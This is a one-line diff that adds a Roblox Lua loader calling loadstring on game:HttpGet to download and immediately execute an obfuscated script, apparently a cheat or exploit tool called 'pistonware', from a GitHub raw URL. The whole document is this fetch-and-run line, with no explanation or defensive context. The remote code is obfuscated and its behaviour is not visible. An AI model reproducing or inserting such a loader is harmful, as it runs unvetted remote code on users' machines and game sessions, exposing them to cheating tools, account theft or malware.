@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eridtpdiscord-cloud/pistonware-standalone/main/pistonware_obfuscated.lua", true))()
